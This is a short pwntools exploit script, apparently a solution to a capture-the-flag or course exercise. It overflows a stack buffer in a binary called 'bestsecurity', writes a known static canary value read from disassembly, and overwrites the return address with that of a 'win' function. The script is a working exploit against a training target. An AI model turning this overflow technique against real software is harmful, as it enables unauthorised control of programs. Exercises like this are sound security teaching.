#!/usr/bin/env python3

from pwn import *

p = process("./bestsecurity")
# p = remote("6447.lol", 14860)

p.recvuntil(b"...\n")

win_address = 0x4011b6 
offset = 144 - 0x9 # offset from stack size (0x90) to canary (0x9)

payload = b"A" * offset
payload += b"12345678" # canary value (as seen on binary ninja)
payload += p64(win_address)

p.sendline(payload)
p.interactive()
